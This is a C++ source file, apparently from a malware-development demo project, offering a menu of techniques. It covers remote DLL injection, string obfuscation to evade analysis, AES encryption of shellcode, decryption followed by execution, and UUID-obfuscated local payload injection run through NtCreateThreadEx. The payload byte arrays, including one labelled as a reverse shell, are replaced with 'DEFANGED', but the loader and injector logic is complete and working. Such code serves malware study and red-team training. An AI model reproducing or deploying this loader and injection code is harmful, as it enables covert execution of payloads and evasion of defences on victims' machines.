#include "structures.h"
#include "functions.h"
unsigned char reverse_shell_test[] = {
		DEFANGED
};
unsigned char pKey[] = {
		DEFANGED };
unsigned char pIv[] = {
		DEFANGED };
unsigned char CipherText[] = {
		DEFANGED };
/* EXAMPLE:  of getting a handle on a module using custom GetModuleHandle*/
void get_a_handle_on_module_example() {
	int str_ntdll_offsets_[] = { 39, 45, 29, 37, 37, 52, 29, 37, 37 };
	string deob_ntdll = rockyGetString(str_ntdll_offsets_, big_string, sizeof(str_ntdll_offsets_)).c_str();
	wstring deobfuscated_ntdll = stringToWstring(deob_ntdll);
	HMODULE rockyHandle = rockyGetModuleHandle(deobfuscated_ntdll.c_str());
	HMODULE rockyHandle2 = rockyGetModuleHandle2(deobfuscated_ntdll.c_str());
	//rockyPrintColor(green, "Search for given DLL name and return its handle");
	rockyPrintColor(green, "[*] rockyGetModuleHandle: working __address__: 0x%p", rockyHandle);
	//rockyPrintColor(green, "DLL enumeration using the head and the linked list's elements");
	rockyPrintColor(green, "[*] rockyGetModuleHandle2: working __address__: 0x%p", rockyHandle2);
}
/* Wait before executing next function */
void next_function() {
	rockyPrintColor(red, "[#]:[LOAD]");
	getchar();
}
/* EXAMPLE:  rockyallocate bytes to memory */
void allocate_memory_bytes_example() {
	/* [ PAYLOAD EXAMPLE OF .DATA] */
	/* .DATA SECTION PAYLOAD::: NOTE: Payloads that are assigned like this are saved in the .data section of the PE Executable */
	unsigned char payload[] = { 0xFC, 0x48, 0x83, 0xE4, 0xF0, 0xE8, 0xC0, 0x00 };
	size_t payload_size = sizeof(payload);
	void* pointer_to_payload = NULL;
	NTSTATUS status = rockyAlloc(payload, payload_size, &pointer_to_payload);
	if (status == STATUS_SUCCESS && pointer_to_payload != NULL) {
		rockyPrintColor(green, "[*] rockyAlloc: able to allocate bytes ");
		rockyPrintAllocated(pointer_to_payload, payload_size);
		rockyDealloc(pointer_to_payload);
	}
	else {
		rockyPrintColor(red, "Failed to allocate raw payload");
	}
}
/* EXAMPLE:  rockyAllocate string */
void allocate_memory_string_example() {
	const char* MyString = "Hello World";
	void* pointer_to_string_address = NULL;
	NTSTATUS status = rockyAlloc(MyString, &pointer_to_string_address);
	if (status == STATUS_SUCCESS && pointer_to_string_address != NULL) {
		rockyPrintAllocated(pointer_to_string_address, strlen(MyString) + 1); // NULL Terminator
		rockyPrintColor(green, "[*] rockyAlloc: able to allocate strings");
		rockyDealloc(pointer_to_string_address);
	}
	else {
		rockyPrintColor(red, "Failed to allocate string to memory");
	}
}
/* EXAMPLE: Loadlibrary custom function*/
void load_a_dll_example() {
	HMODULE hModule = (HMODULE)rockyLoadLibrary(L"user32.dll");
	if (hModule) {
		rockyPrintColor(green, "[*] rockyLoadLibrary: working ");
	}
	else {
		rockyPrintColor(red, "Failed to load DLL");
	}

}
/* EXAMPLE: example of using obfuscation */
void obfuscator() {
	/* Obfuscate a string */
	//char obfuscated_string_test[] = "Hello World";
	//char ntdll_string[] = "NTDLL.DLL";
	//rockyObfuscation(big_string, ntdll_string);
	/* Need to be obfuscated*/
	char str_LdrGetProcedureAddress[] = "LdrGetProcedureAddress";
	char str_LdrLoadDll[] = "LdrLoadDll";
	char str_NtAllocateVirtualMemory[] = "NtAllocateVirtualMemory";
	char str_NtFreeVirtualMemory[] = "NtFreeVirtualMemory";
	char str_GetProcAddress[] = "GetProcAddress";
	char str_NtProtectVirtualMemory[] = "NtProtectVirtualMemory";
	char str_NtCreateThreadEx[] = "NtCreateThreadEx";
	char str_NtWriteProcessMemory[] = "NtWriteProcessMemory";
	/* Obfuscate string here*/
	rockyObfuscation(big_string, str_NtWriteProcessMemory);
	/* Retrive obfuscated string */
	rockyPrintColor(green, "[*] obfuscation: working");
}
DWORD WINAPI Example_Thread_Function(LPVOID lpParam) {
	rockyPrintColor(green, "[!] This is a thread");
	return 0;
}
void executeShellcode(const unsigned char* shellcode, size_t shellcodeSize) {
	try {
		void* allocatedMemory = NULL;
		NTSTATUS status = rockyAlloc(shellcode, shellcodeSize, &allocatedMemory);
		if (status != STATUS_SUCCESS || allocatedMemory == NULL) {
			rockyPrintColor(red, "Failed to allocate memory", status);
			return;
		}
		rockyPrintColor(red, "[*] rockyAlloc: written to memory");
		ULONG oldProtect;

		/* Only using current process here */
		status = rockyVirtualProtect(GetCurrentProcess(), allocatedMemory, shellcodeSize, PAGE_EXECUTE_READWRITE, &oldProtect);
		if (status != STATUS_SUCCESS) {
			std::cerr << "Failed to change memory protection. NTSTATUS: " << status << std::endl;
			rockyDealloc(allocatedMemory);
			return;
		}
		/* basic thread , current process with allocated memory */
		HANDLE hThread = NULL;
		status = rockyCreateThreadEx(&hThread, THREAD_ALL_ACCESS, NULL, GetCurrentProcess(),
			(LPTHREAD_START_ROUTINE)allocatedMemory, NULL, 0, 0, 0, 0, NULL);
		if (status == STATUS_SUCCESS) {
			rockyPrintColor(green, "Shellcode is running in a separate thread.");
			CloseHandle(hThread);
		}
		else {
			rockyPrintColor(red, "Failed, no thread today ");
			rockyDealloc(allocatedMemory);
			return;
		}

	}
	catch (const std::exception& ex) {
		std::cerr << "exception occurred: " << ex.what() << std::endl;
	}
	catch (...) {
		std::cerr << "unknown exception occurred" << std::endl;
	}
}
/* EXAMPLE: Function to Decrypt from AES , able to additionally execute the payload after decryption with execute = true, otherwise just prints out the Decrypted Data */
void decrypt_aes_test(const unsigned char* pCipherText, DWORD cipherTextSize,const unsigned char* pKey, const unsigned char* pIv,bool execute = false)
{
	PVOID pPlaintext = NULL;
	DWORD dwPlainSize = 0;
	// Cast const unsigned char* to PBYTE
	if (!rockyAes_decrypt(
		const_cast<PBYTE>(pCipherText), cipherTextSize,
		const_cast<PBYTE>(pKey), const_cast<PBYTE>(pIv),
		&pPlaintext, &dwPlainSize)) {
		printf("Decryption failed\n");
		return;
	}
	// Validate decryption output
	if (pPlaintext == NULL || dwPlainSize == 0) {
		printf("Decryption returned invalid data\n");
		return;
	}
	// Conditionally execute the decrypted shellcode or print hex data
	if (execute) {
		printf("Executing shellcode...\n");
		executeShellcode((const unsigned char*)pPlaintext, dwPlainSize);
	}
	else {
		printf("Printing hex data...\n");
		PrintHexData("DecryptedData", (PBYTE)pPlaintext, dwPlainSize);
	}
	if (pPlaintext) {
		// Free the memory allocated by InstallAesDecryption
		HeapFree(GetProcessHeap(), 0, pPlaintext);
	}
}
/* EXAMPLE: Function to Encrypt to AES, prints out the data in a encrypted format that can be used elsewhere */
void encrypt_aes_test(const unsigned char* data, size_t dataSize) {
	BYTE pKey[KEYSIZE];
	BYTE pIv[IVSIZE];
	/* seed for generating the key, the key bytes, and for generating the IB*/
	srand(static_cast<unsigned int>(time(NULL)));
	GenerateRandomBytes(pKey, KEYSIZE);
	srand(static_cast<unsigned int>(time(NULL) ^ pKey[0]));
	GenerateRandomBytes(pIv, IVSIZE);
	PrintHexData("pKey", pKey, KEYSIZE);
	PrintHexData("pIv", pIv, IVSIZE);
	PVOID pCipherText = NULL;
	DWORD dwCipherSize = 0;
	// Print the data to be encrypted
	PrintHexData("Data", const_cast<PBYTE>(data), static_cast<DWORD>(dataSize));
	// Encryption test
	if (!rockyAes_encrypt(
		const_cast<PBYTE>(data),
		static_cast<DWORD>(dataSize),
		pKey, pIv, &pCipherText, &dwCipherSize)) {
		rockyPrintColor(red, "Error encrypting AES");
		return;
	}
	PrintHexData("CipherText", static_cast<PBYTE>(pCipherText), dwCipherSize);
	if (pCipherText) {
		HeapFree(GetProcessHeap(), 0, pCipherText);
	}
	system("PAUSE");
}
/* EXAMPLE: creating a basic thread that prints working !! */
void create_thread_example() {
	HANDLE hThread = NULL;
	NTSTATUS status = rockyCreateThreadEx(&hThread, THREAD_ALL_ACCESS, NULL, GetCurrentProcess(), (LPTHREAD_START_ROUTINE)Example_Thread_Function, NULL, 0, 0, 0, 0, NULL);
	if (status == STATUS_SUCCESS) {
		rockyPrintColor(green, "[*] rockyCreateThreadEx: Working");
		WaitForSingleObject(hThread, INFINITE);
		CloseHandle(hThread);
	}
	else {
		rockyPrintColor(red, "[*] rockyCreateThreadEx: Not working ");
	}
}
//void executeShellcode(const unsigned char* shellcode, size_t shellcodeSize);


const char* UuidArray[] = {
		DEFANGED UUID PAYLOAD WOULD BE HERE
};

#define NumberOfElements 32


int local_payload_injection_with_uuid() {
	// WILL NEVER WORK IN DEBUG MODE, ONLY FINAL BUILD?
	rockyPrintColor(green, "Local Payload Execution");

	PBYTE pDeobfuscatedPayload = NULL;
	SIZE_T sDeobfuscatedSize = 0;
	int temp;
	rockyPrintColor(green, "Injecting Shellcode into the local process of Pid: %d", GetCurrentProcessId());
	rockyPrintColor(green, "[#] Press <Enter> To Decrypt ... ");
	temp = getchar();
	rockyPrintColor(yellow, "[i] Decrypting ...");

	// Deobfuscate
	if (!rockyUUID_Deobfuscator((char**)UuidArray, NumberOfElements, &pDeobfuscatedPayload, &sDeobfuscatedSize)) {
		rockyPrintColor(red, "[!] Deobfuscation failed.");
		return -1;
	}

	if (pDeobfuscatedPayload == NULL || sDeobfuscatedSize == 0) {
		rockyPrintColor(red, "[!] Invalid deobfuscated payload. Exiting...");
		return -1;
	}

	rockyPrintColor(green, "[i] Deobfuscated Payload At : 0x%p Of Size : %zu", pDeobfuscatedPayload, sDeobfuscatedSize);

	rockyPrintColor(green, "[#] Press <Enter> To Allocate ... ");
	temp = getchar();

	PVOID pShellcodeAddress = NULL;
	NTSTATUS status = rockyAlloc(pDeobfuscatedPayload, sDeobfuscatedSize, &pShellcodeAddress);

	if (status != STATUS_SUCCESS) {

		rockyPrintColor(red, "[!] rockyAlloc Failed With Error : %d", status);

		return -1;

	}

	rockyPrintColor(green,"[i] Allocated Memory At : 0x%p \n", pShellcodeAddress);

	rockyPrintColor(green,"[#] Press <Enter> To Write Payload ... ");
	temp = getchar();

	memcpy(pShellcodeAddress, pDeobfuscatedPayload, sDeobfuscatedSize);

	memset(pDeobfuscatedPayload, 0, sDeobfuscatedSize);

	DWORD dwOldProtection = 0;
	status = rockyVirtualProtect(GetCurrentProcess(), pShellcodeAddress, sDeobfuscatedSize, PAGE_EXECUTE_READ, &dwOldProtection);
	if (status != STATUS_SUCCESS) {
		rockyPrintColor(red, "[!] rockyVirtualProtect Failed With Error : %d", status);
		return -1;
	}

	rockyPrintColor(green,"[#] Press <Enter> To Run ... ");
	(void)getchar();

	HANDLE hThread = NULL;
	status = rockyCreateThreadEx(&hThread, THREAD_ALL_ACCESS, NULL, GetCurrentProcess(), (LPTHREAD_START_ROUTINE)pShellcodeAddress, NULL, 0, 0, 0, 0, NULL);
	if (status != STATUS_SUCCESS) {
		rockyPrintColor(red, "[!] rockyCreateThreadEx Failed With Error : %d \n", status);
		return -1;
	}
	WaitForSingleObject(hThread, INFINITE);
	CloseHandle(hThread);
	HeapFree(GetProcessHeap(), 0, pDeobfuscatedPayload);
	printf("[#] Press <Enter> To Quit ... ");
	(void)getchar();

	return 0;
}


/*Process Injection - DLL Injection into remote process*/
void remote_dll_injector() {
	rockyPrintColor(green, "Remote DLL Injector");
	HANDLE hProcess = NULL;
	DWORD dwProcessId = NULL;
	wchar_t dllPath[MAX_PATH];
	wchar_t processName[MAX_PATH];

	/*Prompts*/
	wprintf(L"[i] Enter Complete DLL Payload Path (e.g., C:\\Users\\user\\Documents\\example.dll): ");
	fgetws(dllPath, MAX_PATH, stdin);
	dllPath[wcslen(dllPath) - 1] = L'\0';

	wprintf(L"[i] Enter Process Name (e.g., notepad.exe): ");
	fgetws(processName, MAX_PATH, stdin);
	// silly new line characters
	processName[wcslen(processName) - 1] = L'\0';

	wprintf(L"[i] Searching For Process Id Of \"%s\" ... ", processName);
	if (!rockyGetRemoteProcessHandle(processName, &dwProcessId, &hProcess)) {
		printf("[!] Process is Not Found \n");
		return;
	}
	wprintf(L"[+] DONE \n");

	printf("[i] Found Target Process Pid: %d \n", dwProcessId);

	if (!rockyInjectDLL(hProcess, dllPath)) {
		return;
	}

	CloseHandle(hProcess);
	printf("[#] Press <Enter> To Quit ... ");
	(void)getchar();
}


void show_example_menu() {
	int choice;
	wchar_t buffer[10];

	while (true) {
		rockyPrintColor(yellow, "MalDev Demos");
		rockyPrintColor(green, "Select an example to run");
		rockyPrintColor(yellow, "1. Process Injection - DLL Injection (Inject local DLL into remote process");
		rockyPrintColor(yellow, "2. Get Module Handle using 2 methods - Head and Node/Double Linked Lists Concept & Enum of DLL pointer");
		rockyPrintColor(yellow, "3. Custom rockyAlloc NTAPI example , allocate Bytes to memory");
		//rockyPrintColor(yellow, "3. rockyAlloc, overloaded custom function, allocate string to memory");
		rockyPrintColor(yellow, "4. rockyLoadLibrary, Load a DLL example");
		rockyPrintColor(yellow, "5. basic index obfuscator to evade basic analysis");
		rockyPrintColor(yellow, "6. basic rockyCreateThreadEx NTAPI to create thread");
		rockyPrintColor(yellow, "7. basic AES Encryption of shellcode");
		rockyPrintColor(yellow, "8. basic AES Decryption and then execution of shellcode");
		rockyPrintColor(yellow, "9. Execute Shellcode using combination of NTAPI ");
		rockyPrintColor(yellow, "10. Local Payload Injection with UUID example");
		rockyPrintColor(red, "11. Exit ");
		rockyPrintColor(green, "Enter Choice> ");

		fgetws(buffer, sizeof(buffer) / sizeof(buffer[0]), stdin);

		choice = _wtoi(buffer);

		switch (choice) {
		case 1:
			remote_dll_injector();
			break;
		case 2:
			get_a_handle_on_module_example();
			break;
		case 3:
			allocate_memory_bytes_example();
			break;
		case 4:
			load_a_dll_example();
			break;
		case 5:
			obfuscator();
			break;
		case 6:
			create_thread_example();
			break;
		case 7: {
			rockyPrintColor(green, "Starting AES Encryption");
			size_t shellcodeSize = sizeof(reverse_shell_test);
			encrypt_aes_test(reverse_shell_test, shellcodeSize);
			break;
		}
		case 8: {
			rockyPrintColor(green, "Starting AES Decryption, and then executing it:");
			DWORD CipherTextSize = sizeof(CipherText);
			decrypt_aes_test(CipherText, CipherTextSize, pKey, pIv, true);
			break;
		}
		case 9: {
			rockyPrintColor(green, "Executing basic shellcode reverse shell");
			size_t shellcodeSizea = sizeof(reverse_shell_test);
			executeShellcode(reverse_shell_test, shellcodeSizea);
			break;
		}
		case 10:
			local_payload_injection_with_uuid();
		case 11: 
			rockyPrintColor(red, "Exiting");
			return;
		default:
			rockyPrintColor(red, "Invalid Choice");
		}
		next_function();
	}
}



int main() {
	show_example_menu();
	return 0;
}
